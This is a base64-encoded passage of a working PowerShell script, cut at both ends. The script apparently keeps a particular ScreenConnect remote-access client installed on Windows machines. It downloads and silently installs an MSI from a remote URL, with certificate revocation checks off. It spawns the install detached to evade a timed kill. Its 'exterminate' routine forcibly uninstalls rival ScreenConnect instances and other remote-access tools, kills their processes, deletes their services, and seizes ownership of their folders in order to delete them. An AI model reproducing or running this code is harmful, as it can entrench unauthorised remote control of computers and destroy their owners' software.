IgogICAgICAgIH0KICAgIH0KICAgICMgTzQ2OiBTVFVDSyDigJQgcmVnaXN0ZXJlZCBidXQgbm8g
c2VydmljZSBhbmQgbm8gZGlyLiAvZmEgZGllcyB0byB0aGUgU0MgR3Vlc3QKICAgICMgMTBzIGtp
bGwgYmVmb3JlIG1zaWV4ZWMgZmluaXNoZXMsIHNvIHRoZSBsb29wIG5ldmVyIGVuZHMuIEluc3Rl
YWQ6IG51a2UgQVJQCiAgICAjIHNvIHNhbWUtRlAgL2kgcmUtcmVnaXN0ZXJzLCB0aGVuIGZhbGwg
VEhST1VHSCB0byB0aGUgY2FjaGVkLU1TSSAvaSBiZWxvdwogICAgIyAod2hpY2ggcnVucyBsb25n
IGVub3VnaCBvbmx5IHdoZW4gY2FsbGVkIGRldGFjaGVkOyBtb24gdGlja3MgYXJlIGRldGFjaGVk
KS4KICAgIGlmICgoRmluZC1Qcm9kdWN0R3VpZCAkZnBUcnkpIC1hbmQgLW5vdCAkc3ZjIC1hbmQg
LW5vdCAoVGVzdC1TY0RpciAkZnBUcnkpKSB7CiAgICAgICAgR0xvZyAnc3R1Y2tfcmVnaXN0ZXJl
ZF9udWtlX2FycCcKICAgICAgICAkZ3VpZCA9IEZpbmQtUHJvZHVjdEd1aWQgJGZwVHJ5CiAgICAg
ICAgZm9yZWFjaCAoJHIgaW4gQCgnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3Vy
cmVudFZlcnNpb25cVW5pbnN0YWxsJywKICAgICAgICAgICAgICAgICAgICAgICAgICdIS0xNOlxT
T0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmlu
c3RhbGwnKSkgewogICAgICAgICAgICBpZiAoJGd1aWQgLWFuZCAoVGVzdC1QYXRoICIkclwkZ3Vp
ZCIpKSB7CiAgICAgICAgICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggIiRyXCRndWlk
IiAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAg
ICAgfQogICAgICAgIH0KICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0
aCAkV29ya0RpciAnZ3J5eGFfcmVpbnN0YWxsLmZsYWcnKSAtRm9yY2UgLUVycm9yQWN0aW9uIFNp
bGVudGx5Q29udGludWUKICAgICAgICBHTG9nICdzdHVja19hcnBfbnVrZWRfZmFsbF90aHJvdWdo
X3RvX2luc3RhbGwnCiAgICB9IGVsc2VpZiAoRmluZC1Qcm9kdWN0R3VpZCAkZnBUcnkpIHsKICAg
ICAgICBHTG9nICdsaWdodF9yZXBhaXJfYXR0ZW1wdCcKICAgICAgICAkbnVsbCA9IFJlcGFpci1T
Q1NlcnZpY2UgJGZwVHJ5CiAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgNAogICAgICAgIGlm
IChUZXN0LVNjUnVubmluZyAkZnBUcnkpIHsKICAgICAgICAgICAgU2V0LUdyeXhhRnAgJGZwVHJ5
CiAgICAgICAgICAgIEdMb2cgJ2xpZ2h0X3JlcGFpcmVkX29rJwogICAgICAgICAgICByZXR1cm4g
IkhFQUxUSFl8JGZwVHJ5fHJlcGFpcmVkPTEiCiAgICAgICAgfQogICAgfQogICAgJHJ1bm5pbmdG
cCA9IEZpbmQtUnVubmluZ0dyeXhhRnAKICAgIGlmICgkcnVubmluZ0ZwKSB7CiAgICAgICAgU2V0
LUdyeXhhRnAgJHJ1bm5pbmdGcAogICAgICAgIEdMb2cgImxpZ2h0X2ZvdW5kX290aGVyX3J1bm5p
bmc9JHJ1bm5pbmdGcCIKICAgICAgICByZXR1cm4gIkhFQUxUSFl8JHJ1bm5pbmdGcHxydW5uaW5n
PTF8ZGlzY292ZXJlZCIKICAgIH0KCiAgICBpZiAoLW5vdCAkRm9yY2UgLWFuZCAoVGVzdC1BbnlO
b25TZXZyelNjUnVubmluZykpIHsKICAgICAgICAkcnVubmluZ0ZwID0gRmluZC1SdW5uaW5nR3J5
eGFGcAogICAgICAgIFNldC1Hcnl4YUZwICRydW5uaW5nRnAKICAgICAgICByZXR1cm4gIkhFQUxU
SFl8JHJ1bm5pbmdGcHxydW5uaW5nPTF8Z3VhcmQiCiAgICB9CgogICAgIyBtc2lleGVjIHBhdGgg
b25seSBmcm9tIGhlcmUg4oCUIHJhdGUtbGltaXQgYXBwbGllcyAodW5sZXNzIC1Gb3JjZSAvIGZ1
bGx5IGFic2VudCkKICAgIGlmICgtbm90ICRGb3JjZSAtYW5kIC1ub3QgKFRlc3QtR3J5eGFSZWlu
c3RhbGxBbGxvd2VkKSkgewogICAgICAgIEdMb2cgJ3JlaW5zdGFsbF9yYXRlX2xpbWl0ZWQnCiAg
ICAgICAgcmV0dXJuICJVTkhFQUxUSFl8JG9sZEZwfHJhdGUtbGltaXRlZCIKICAgIH0KCiAgICAk
bXNpID0gSm9pbi1QYXRoICRXb3JrRGlyICdwa2dfZ3J5eGEubXNpJwogICAgJHRtcCA9IEpvaW4t
UGF0aCAkZW52OlRFTVAgKCJzY19ncnl4YV97MH0ubXNpIiAtZiBbZ3VpZF06Ok5ld0d1aWQoKS5U
b1N0cmluZygnTicpKQogICAgJGZldGNoZWQgPSAkZmFsc2UKICAgIHRyeSB7CiAgICAgICAgJGN1
cmwgPSBKb2luLVBhdGggJGVudjpTeXN0ZW1Sb290ICdTeXN0ZW0zMlxjdXJsLmV4ZScKICAgICAg
ICBpZiAoLW5vdCAoVGVzdC1QYXRoICRjdXJsKSkgeyAkY3VybCA9ICdjdXJsLmV4ZScgfQogICAg
ICAgICYgJGN1cmwgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tbWF4
LXRpbWUgMzAwIC1vICR0bXAgJHNjcmlwdDpHcnl4YU1zaVVybCAyPiYxIHwgT3V0LU51bGwKICAg
ICAgICBpZiAoKFRlc3QtUGF0aCAkdG1wKSAtYW5kICgoR2V0LUl0ZW0gJHRtcCkuTGVuZ3RoIC1n
dCAxMDAwMDAwKSkgewogICAgICAgICAgICBDb3B5LUl0ZW0gLUxpdGVyYWxQYXRoICR0bXAgLURl
c3RpbmF0aW9uICRtc2kgLUZvcmNlCiAgICAgICAgICAgICRmZXRjaGVkID0gJHRydWUKICAgICAg
ICAgICAgR0xvZyAoIm1zaV9mZXRjaGVkIGJ5dGVzPXswfSIgLWYgKEdldC1JdGVtICRtc2kpLkxl
bmd0aCkKICAgICAgICB9CiAgICB9IGNhdGNoIHsgR0xvZyAibXNpX2ZldGNoX2Vycj0kXyIgfQog
ICAgZmluYWxseSB7IFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkdG1wIC1Gb3JjZSAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZSB9CgogICAgaWYgKC1ub3QgJGZldGNoZWQgLWFuZCAoVGVz
dC1QYXRoICRtc2kpIC1hbmQgKChHZXQtSXRlbSAkbXNpKS5MZW5ndGggLWd0IDEwMDAwMDApKSB7
CiAgICAgICAgJGZldGNoZWQgPSAkdHJ1ZQogICAgICAgIEdMb2cgJ21zaV91c2luZ19jYWNoZScK
ICAgIH0KICAgIGlmICgtbm90ICRmZXRjaGVkKSB7CiAgICAgICAgR0xvZyAnbXNpX2ZldGNoX0ZB
SUwnCiAgICAgICAgcmV0dXJuICJVTkhFQUxUSFl8JG9sZEZwfG1zaS1mZXRjaC1mYWlsIgogICAg
fQoKICAgICRwcm9kTmFtZSA9IEdldC1Nc2lQcm9wZXJ0eSAkbXNpICdQcm9kdWN0TmFtZScKICAg
ICRuZXdGcCA9IEdldC1GcEZyb21Qcm9kdWN0TmFtZSAkcHJvZE5hbWUKICAgIGlmICgtbm90ICRu
ZXdGcCkgewogICAgICAgIEdMb2cgIm1zaV9mcF9wYXJzZV9GQUlMIG5hbWU9JHByb2ROYW1lIgog
ICAgICAgIHJldHVybiAiVU5IRUFMVEhZfCRvbGRGcHxtc2ktZnAtcGFyc2UtZmFpbCIKICAgIH0K
ICAgIEdMb2cgIm1zaV9mcD0kbmV3RnAgcHJvZHVjdD0kcHJvZE5hbWUiCgogICAgaWYgKC1ub3Qg
JEZvcmNlIC1hbmQgKFRlc3QtQW55Tm9uU2V2cnpTY1J1bm5pbmcpKSB7CiAgICAgICAgJHJ1bm5p
bmdGcCA9IEZpbmQtUnVubmluZ0dyeXhhRnAKICAgICAgICBTZXQtR3J5eGFGcCAkcnVubmluZ0Zw
CiAgICAgICAgR0xvZyAnYWJvcnRfaW5zdGFsbF9iZWNhbWVfcnVubmluZycKICAgICAgICByZXR1
cm4gIkhFQUxUSFl8JHJ1bm5pbmdGcHxydW5uaW5nPTF8YWJvcnQtaW5zdGFsbCIKICAgIH0KCiAg
ICBNYXJrLUdyeXhhUmVpbnN0YWxsCiAgICBpZiAoRmluZC1Qcm9kdWN0R3VpZCAkbmV3RnApIHsK
ICAgICAgICBHTG9nICJyZXBhaXJfYmVmb3JlX2luc3RhbGw9JG5ld0ZwIgogICAgICAgICRudWxs
ID0gUmVwYWlyLVNDU2VydmljZSAkbmV3RnAKICAgICAgICBpZiAoVGVzdC1TY1J1bm5pbmcgJG5l
d0ZwKSB7CiAgICAgICAgICAgIFNldC1Hcnl4YUZwICRuZXdGcAogICAgICAgICAgICByZXR1cm4g
IkhFQUxUSFl8JG5ld0ZwfHJlcGFpcmVkPTEiCiAgICAgICAgfQogICAgICAgIEdMb2cgInVuaW5z
dGFsbF9zdHVjaz0kbmV3RnAiCiAgICAgICAgJG51bGwgPSBVbmluc3RhbGwtU2NGaW5nZXJwcmlu
dCAkbmV3RnAKICAgIH0KICAgIGlmICgkb2xkRnAgLWFuZCAkb2xkRnAgLW5lICRuZXdGcCAtYW5k
IChGaW5kLVByb2R1Y3RHdWlkICRvbGRGcCkpIHsKICAgICAgICBHTG9nICJ1bmluc3RhbGxfb2xk
X2NmZz0kb2xkRnAiCiAgICAgICAgJG51bGwgPSBVbmluc3RhbGwtU2NGaW5nZXJwcmludCAkb2xk
RnAKICAgIH0KCiAgICBTZXQtR3J5eGFGcCAkbmV3RnAKICAgICMgTzQ2OiBzcGF3biB0aGUgcmVh
bCAvaSBERVRBQ0hFRCBzbyB0aGUgU0MgR3Vlc3QgMTBzIGtpbGwgb24gdGhlIG1vbiB0aWNrCiAg
ICAjIGNhbm5vdCBhYm9ydCBtc2lleGVjLiBSZXR1cm4gaW1tZWRpYXRlbHk7IHRoZSBuZXh0IHRp
Y2sgdmVyaWZpZXMgc2VydmljZS4KICAgICRudWxsID0gSW5zdGFsbC1Hcnl4YURldGFjaGVkICRt
c2kgJG5ld0ZwCiAgICBHTG9nICJtc2lleGVjX2RldGFjaGVkX3NwYXduZWQgZnA9JG5ld0ZwIgog
ICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgMgogICAgcmV0dXJuICJIRUFMVEhZfCRuZXdGcHxpbnN0
YWxsLXNwYXduZWQ9MSIKCmZ1bmN0aW9uIEludm9rZS1FeHRlcm1pbmF0ZSB7CiAgICAjIEw3OiB0
cnVlIHJlbW92YWwuIENvcnJlY3QgV09XNjQzMk5vZGUgaGl2ZSArIG1zaWV4ZWMgKyBVbmluc3Rh
bGxTdHJpbmcKICAgICMgZmFsbGJhY2sgKyBmb3JjZSBkaXIgbnVrZS4gS2VlcCBzZXZyeithbHQr
Y3VycmVudCBncnl4YSBGUCAoZ3J5eGEuY2ZnKS4KICAgICMgTzQxOiBzeW5jIFJ1bm5pbmcgR3J5
eGEgRlAgaW50byBjZmcgQkVGT1JFIGFueSBraWxsOyBuZXZlciBraWxsIFNDIHByb2NzCiAgICAj
IHdpdGhvdXQgYSBmb3JlaWduIEZQIGluIHBhdGgvY21kbGluZSAobnVsbCBwYXRoIHdhcyBraWxs
aW5nIEdyeXhhIGV2ZXJ5IHRpY2spLgogICAgJGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnZXh0
ZXJtaW5hdGUubG9nJwogICAgJHJ1bm5pbmdHID0gRmluZC1SdW5uaW5nR3J5eGFGcAogICAgaWYg
KCRydW5uaW5nRykgeyBTZXQtR3J5eGFGcCAkcnVubmluZ0cgfQogICAgJGtlZXAgPSBAKEdldC1L
ZWVwRmluZ2VycHJpbnRzKQogICAgJG4gPSBAeyBzdmMgPSAwOyBwcm9jID0gMDsgZGlyID0gMDsg
cHJvZHVjdCA9IDA7IHJtbSA9IDA7IGZhaWwgPSAwIH0KICAgIGZ1bmN0aW9uIExvZyhbc3RyaW5n
XSRtKSB7CiAgICAgICAgJGxpbmUgPSAnezB9IHsxfScgLWYgKEdldC1EYXRlIC1Gb3JtYXQgJ3l5
eXktTU0tZGQgSEg6bW06c3MnKSwgJG0KICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGgg
JGxvZyAtVmFsdWUgJGxpbmUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAj
IE80MTogZG8gTk9UIFdyaXRlLU91dHB1dCBMb2cgbGluZXMgKHBvbGx1dGVzIGZvciAvZiBjYWxs
ZXJzKQogICAgfQogICAgIyBQcm90ZWN0IEdyeXhhIGR1cmluZyBzdGFydCByYWNlOiBhbnkgbGl2
ZSBTQyBwcm9jZXNzIHdob3NlIHBhdGggZW1iZWRzIGEKICAgICMgbm9uLXNldnJ6IEZQIGlzIGEg
a2VlcGVyIGV2ZW4gaWYgdGhlIHNlcnZpY2UgaXMgbm90IFJ1bm5pbmcgeWV0LgogICAgR2V0LUNp
bUluc3RhbmNlIFdpbjMyX1Byb2Nlc3MgLUZpbHRlciAiTmFtZSBsaWtlICdTY3JlZW5Db25uZWN0
JSciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAg
ICAgICRibG9iID0gIiQoW3N0cmluZ10kXy5FeGVjdXRhYmxlUGF0aCkgJChbc3RyaW5nXSRfLkNv
bW1hbmRMaW5lKSIKICAgICAgICBpZiAoJGJsb2IgLW1hdGNoICdTY3JlZW5Db25uZWN0IENsaWVu
dCBcKChbMC05YS1mQS1GXXsxNn0pXCknKSB7CiAgICAgICAgICAgICRmcCA9ICRNYXRjaGVzWzFd
LlRvTG93ZXIoKQogICAgICAgICAgICBpZiAoJGZwIC1ub3RpbiAkc2NyaXB0OlNldnJ6S2VlcCAt
YW5kICRmcCAtbm90aW4gJGtlZXApIHsKICAgICAgICAgICAgICAgICRrZWVwICs9ICRmcAogICAg
ICAgICAgICAgICAgU2V0LUdyeXhhRnAgJGZwCiAgICAgICAgICAgICAgICBMb2cgImtlZXBfYWRk
X2Zyb21fcHJvYyBmcD0kZnAiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBmdW5j
dGlvbiBJcy1LZWVwZXIoW3N0cmluZ10kcykgewogICAgICAgIGlmICgtbm90ICRzKSB7IHJldHVy
biAkZmFsc2UgfQogICAgICAgIGZvcmVhY2ggKCRrIGluICRrZWVwKSB7IGlmICgkcyAtbGlrZSAi
KiRrKiIpIHsgcmV0dXJuICR0cnVlIH0gfQogICAgICAgIHJldHVybiAkZmFsc2UKICAgIH0KICAg
IGZ1bmN0aW9uIEZvcmNlLVJlbW92ZURpcihbc3RyaW5nXSRkKSB7CiAgICAgICAgaWYgKC1ub3Qg
JGQgLW9yIC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpKSB7IHJldHVybiAkdHJ1ZSB9
CiAgICAgICAgR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3MgLUVycm9yQWN0aW9uIFNpbGVu
dGx5Q29udGludWUgfAogICAgICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5FeGVjdXRhYmxlUGF0
aCAtYW5kICRfLkV4ZWN1dGFibGVQYXRoLlN0YXJ0c1dpdGgoJGQsIFtTdHJpbmdDb21wYXJpc29u
XTo6T3JkaW5hbElnbm9yZUNhc2UpIH0gfAogICAgICAgICAgICBGb3JFYWNoLU9iamVjdCB7IFN0
b3AtUHJvY2VzcyAtSWQgJF8uUHJvY2Vzc0lkIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
b250aW51ZSB9CiAgICAgICAgJiB0YWtlb3duLmV4ZSAvRiAkZCAvUiAvRCBZIDI+JjEgfCBPdXQt
TnVsbAogICAgICAgICYgaWNhY2xzLmV4ZSAkZCAvZ3JhbnQgJypTLTEtNS0zMi01NDQ6RicgL1Qg
L0MgL1EgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgJiBpY2FjbHMuZXhlICRkIC9ncmFudCAnQWRt
aW5pc3RyYXRvcnM6RicgL1QgL0MgL1EgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgUmVtb3ZlLUl0
ZW0gLUxpdGVyYWxQYXRoICRkIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
b250aW51ZQogICAgICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKSB7CiAgICAgICAg
ICAgIGNtZC5leGUgL2MgImF0dHJpYiAtaCAtcyAtciAvcyAvZCBgIiRkXCouKmAiIiAyPiYxIHwg
T3V0LU51bGwKICAgICAgICAgICAgY21kLmV4ZSAvYyAicm1kaXIgL3MgL3EgYCIkZGAiIiAyPiYx
IHwgT3V0LU51bGwKICAgICAgICB9CiAgICAgICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGgg
JGQpIHsKICAgICAgICAgICAgJGVtcHR5ID0gSm9pbi1QYXRoICRlbnY6VEVNUCAoIm93bl9lbXB0
eV8iICsgW2d1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmcoJ04nKSkKICAgICAgICAgICAgTmV3LUl0
ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAkZW1wdHkgLUZvcmNlIHwgT3V0LU51bGwKICAg
ICAgICAgICAgJiByb2JvY29weS5leGUgJGVtcHR5ICRkIC9NSVIgL1I6MCAvVzowIDI+JjEgfCBP
dXQtTnVsbAogICAgICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJGVtcHR5IC1Gb3Jj
ZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgICAgICBSZW1vdmUtSXRlbSAt
TGl0ZXJhbFBhdGggJGQgLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
bnVlCiAgICAgICAgfQogICAgICAgIHJldHVybiAtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRo
ICRkKQogICAgfQogICAgZnVuY3Rpb24gVW5pbnN0YWxsLVByb2R1Y3RLZXkoJGtleSkgewogICAg
ICAgICRndWlkID0gJGtleS5QU0NoaWxkTmFtZQogICAgICAgICRwcm9wID0gR2V0LUl0ZW1Qcm9w
ZXJ0eSAka2V5LlBTUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgICRk
biA9ICRwcm9wLkRpc3BsYXlOYW1lCiAgICAgICAgaWYgKCRndWlkIC1saWtlICd7Kn0nKSB7CiAg
ICAgICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJndW1lbnRMaXN0ICIv
eCAkZ3VpZCAvcW4gL25vcmVzdGFydCBSRUJPT1Q9UmVhbGx5U3VwcHJlc3MiIC1XYWl0IC1QYXNz
VGhydSAtV2luZG93U3R5bGUgSGlkZGVuCiAgICAgICAgICAgIExvZyAicHJvZHVjdF9tc2lleGVj
IFskZG5dIGd1aWQ9JGd1aWQgZXhpdD0kKCRwLkV4aXRDb2RlKSIKICAgICAgICAgICAgaWYgKCRw
LkV4aXRDb2RlIC1pbiAwLCAxNjA1LCAxNjE0LCAzMDEwKSB7IHJldHVybiAkdHJ1ZSB9CiAgICAg
ICAgfQogICAgICAgICR1cyA9ICRwcm9wLlVuaW5zdGFsbFN0cmluZwogICAgICAgIGlmICgkdXMp
IHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGlmICgkdXMgLW1hdGNoICcoP2kp
bXNpZXhlYycpIHsKICAgICAgICAgICAgICAgICAgICAkYXJncyA9ICgkdXMgLXJlcGxhY2UgJyg/
aSleLiptc2lleGVjKFwuZXhlKT9ccyonLCAnJykKICAgICAgICAgICAgICAgICAgICBpZiAoJGFy
Z3MgLW5vdG1hdGNoICcvcW4nKSB7ICRhcmdzID0gIiRhcmdzIC9xbiAvbm9yZXN0YXJ0IiB9CiAg
ICAgICAgICAgICAgICAgICAgJHAgPSBTdGFydC1Qcm9jZXNzIG1zaWV4ZWMuZXhlIC1Bcmd1bWVu
dExpc3QgJGFyZ3MgLVdhaXQgLVBhc3NUaHJ1IC1XaW5kb3dTdHlsZSBIaWRkZW4KICAgICAgICAg
ICAgICAgICAgICBMb2cgInByb2R1Y3RfdW5pbnN0YWxsc3RyaW5nX21zaSBbJGRuXSBleGl0PSQo
JHAuRXhpdENvZGUpIgogICAgICAgICAgICAgICAgICAgIHJldHVybiAoJHAuRXhpdENvZGUgLWlu
IDAsIDE2MDUsIDE2MTQsIDMwMTApCiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAg
ICAgICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBjbWQuZXhlIC1Bcmd1bWVudExpc3QgIi9jICR1
cyAvUyAvc2lsZW50IC9xdWlldCAvcW4iIC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlk
ZGVuCiAgICAgICAgICAgICAgICAgICAgTG9nICJwcm9kdWN0X3VuaW5zdGFsbHN0cmluZ19leGUg
WyRkbl0gZXhpdD0kKCRwLkV4aXRDb2RlKSIKICAgICAgICAgICAgICAgICAgICByZXR1cm4gKCRw
LkV4aXRDb2RlIC1lcSAwKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGNhdGNoIHsg
TG9nICJwcm9kdWN0X3VuaW5zdGFsbHN0cmluZ19GQUlMIFskZG5dICRfIiB9CiAgICAgICAgfQog
ICAgICAgIHJldHVybiAkZmFsc2UKICAgIH0KCiAgICBMb2cgJ2V4dGVybWluYXRlX2VuZ2luZV9M
N19iZWdpbicKCiAgICAjIDEuIGZvcmVpZ24gU0MgcHJvZHVjdHMgZnJvbSBCT1RIIGNvcnJlY3Qg
QVJQIGhpdmVzCiAgICAkc2VlbiA9IEB7fQogICAgZm9yZWFjaCAoJHJvb3QgaW4gJHNjcmlwdDpV
bmluc3RhbGxSb290cykgewogICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggJHJvb3QpKSB7IExv
ZyAiaGl2ZV9taXNzaW5nICRyb290IjsgY29udGludWUgfQogICAgICAgIExvZyAiaGl2ZV9zY2Fu
ICRyb290IgogICAgICAgIEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICRwcm9wID0gR2V0LUl0ZW1Q
cm9wZXJ0eSAkXy5QU1BhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAg
ICAgJGRuID0gJHByb3AuRGlzcGxheU5hbWUKICAgICAgICAgICAgaWYgKC1ub3QgJGRuKSB7IHJl
dHVybiB9CiAgICAgICAgICAgIGlmICgkZG4gLW5vdG1hdGNoICcoP2kpU2NyZWVuQ29ubmVjdFxz
K0NsaWVudFxzKlwoKFswLTlBLUZhLWZdezE2fSlcKScpIHsgcmV0dXJuIH0KICAgICAgICAgICAg
JGZwID0gJE1hdGNoZXNbMV0uVG9Mb3dlcigpCiAgICAgICAgICAgIGlmICgkZnAgLWluICRrZWVw
KSB7IHJldHVybiB9CiAgICAgICAgICAgIGlmICgkc2Vlbi5Db250YWluc0tleSgkXy5QU0NoaWxk
TmFtZSkpIHsgcmV0dXJuIH0KICAgICAgICAgICAgJHNlZW5bJF8uUFNDaGlsZE5hbWVdID0gJHRy
dWUKICAgICAgICAgICAgaWYgKFVuaW5zdGFsbC1Qcm9kdWN0S2V5ICRfKSB7ICRuLnByb2R1Y3Qr
KyB9IGVsc2UgeyAkbi5mYWlsKys7IExvZyAicHJvZHVjdF9SRU1PVkVfRkFJTEVEIFskZG5dIiB9
CiAgICAgICAgfQogICAgfQoKICAgICMgMi4gZm9yZWlnbiBTQyBzZXJ2aWNlcwogICAgZm9yZWFj
aCAoJHN2YyBpbiAoR2V0LVNlcnZpY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBX
aGVyZS1PYmplY3QgeyAkXy5OYW1lIC1saWtlICdTY3JlZW5Db25uZWN0IENsaWVudConIH0pKSB7
CiAgICAgICAgaWYgKElzLUtlZXBlciAkc3ZjLk5hbWUpIHsgY29udGludWUgfQogICAgICAgICYg
c2MuZXhlIHN0b3AgIiQoJHN2Yy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgU3RhcnQt
U2xlZXAgLU1pbGxpc2Vjb25kcyA2MDAKICAgICAgICAmIHNjLmV4ZSBkZWxldGUgIiQoJHN2Yy5O
YW1lKSIgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgJG4uc3ZjKys7IExvZyAic3ZjX2RlbGV0ZWQg
JCgkc3ZjLk5hbWUpIgogICAgfQoKICAgICMgMy4gZm9yZWlnbiBTQyBwcm9jZXNzZXMg4oCUIE9O
TFkgaWYgcGF0aC9jbWRsaW5lIGVtYmVkcyBhIE5PTi1rZWVwZXIgRlAuCiAgICAjIE80MTogbnVs
bCBFeGVjdXRhYmxlUGF0aCB1c2VkIHRvIGtpbGwgR3J5eGEgQ2xpZW50U2VydmljZSBldmVyeSB0
aWNrIOKGkiByZWluc3RhbGwgbG9vcC4KICAgIEdldC1DaW1JbnN0YW5jZSBXaW4zMl9Qcm9jZXNz
IC1GaWx0ZXIgIk5hbWUgbGlrZSAnU2NyZWVuQ29ubmVjdCUnIiAtRXJyb3JBY3Rpb24gU2lsZW50
bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAkZXhlID0gW3N0cmluZ10kXy5F
eGVjdXRhYmxlUGF0aAogICAgICAgICRjbWQgPSBbc3RyaW5nXSRfLkNvbW1hbmRMaW5lCiAgICAg
ICAgJGJsb2IgPSAiJGV4ZSAkY21kIgogICAgICAgIGlmIChJcy1LZWVwZXIgJGJsb2IpIHsgcmV0
dXJuIH0KICAgICAgICBpZiAoJGJsb2IgLW5vdG1hdGNoICdcKChbMC05YS1mQS1GXXsxNn0pXCkn
KSB7CiAgICAgICAgICAgIExvZyAicHJvY19za2lwX25vX2ZwIHBpZD0kKCRfLlByb2Nlc3NJZCkg
bmFtZT0kKCRfLk5hbWUpIgogICAgICAgICAgICByZXR1cm4KICAgICAgICB9CiAgICAgICAgJGZw
ID0gJE1hdGNoZXNbMV0uVG9Mb3dlcigpCiAgICAgICAgaWYgKCRmcCAtaW4gJGtlZXApIHsgcmV0
dXJuIH0KICAgICAgICBTdG9wLVByb2Nlc3MgLUlkICRfLlByb2Nlc3NJZCAtRm9yY2UgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAkbi5wcm9jKys7IExvZyAicHJvY19raWxs
ZWQgcGlkPSQoJF8uUHJvY2Vzc0lkKSBmcD0kZnAgZXhlPSRleGUiCiAgICB9CgogICAgIyA0LiBm
b3JlaWduIFNDIGluc3RhbGwgZGlycyAoUEYgKyBQRjg2KQogICAgZm9yZWFjaCAoJGJhc2UgaW4g
QCgkZW52OlByb2dyYW1GaWxlcywgJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9KSkgewogICAgICAg
IGlmICgtbm90ICRiYXNlIC1vciAtbm90IChUZXN0LVBhdGggJGJhc2UpKSB7IGNvbnRpbnVlIH0K
ICAgICAgICBHZXQtQ2hpbGRJdGVtIC1MaXRlcmFsUGF0aCAkYmFzZSAtRGlyZWN0b3J5IC1Gb3Jj
ZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVj
dCB7ICRfLk5hbWUgLWxpa2UgJ1NjcmVlbkNvbm5lY3QqJyB9IHwgRm9yRWFjaC1PYmplY3Qgewog
ICAgICAgICAgICAgICAgJGQgPSAkXy5GdWxsTmFtZQogICAgICAgICAgICAgICAgaWYgKElzLUtl
ZXBlciAkZCkgeyByZXR1cm4gfQogICAgICAgICAgICAgICAgaWYgKEZvcmNlLVJlbW92ZURpciAk
ZCkgeyAkbi5kaXIrKzsgTG9nICJkaXJfcmVtb3ZlZCAkZCIgfQogICAgICAgICAgICAgICAgZWxz
ZSB7ICRuLmZhaWwrKzsgTG9nICJkaXJfUkVNT1ZFX0ZBSUxFRCAkZCIgfQogICAgICAgICAgICB9
CiAgICB9CgogICAgIyA1LiBkaXNhbGxvd2VkIFJNTSAvIHJlbW90ZS1hY2Nlc3MgdG9vbHMgKG1h
cmtldCBjb3ZlcmFnZSAyMDI2KS4KICAgICMgS0VFUCBmb3JldmVyOiBEYXR0by9DZW50cmFTdGFn
ZSArIFNjcmVlbkNvbm5lY3Qga2VlcCBGUHMgKGhhbmRsZWQgYWJvdmUpLgogICAgIyBORVZFUiBw
dXQgRGF0dG8vQ2VudHJhU3RhZ2UvQ2FnU2VydmljZSBpbiB0aGlzIGxpc3QuCiAgICBmdW5jdGlv
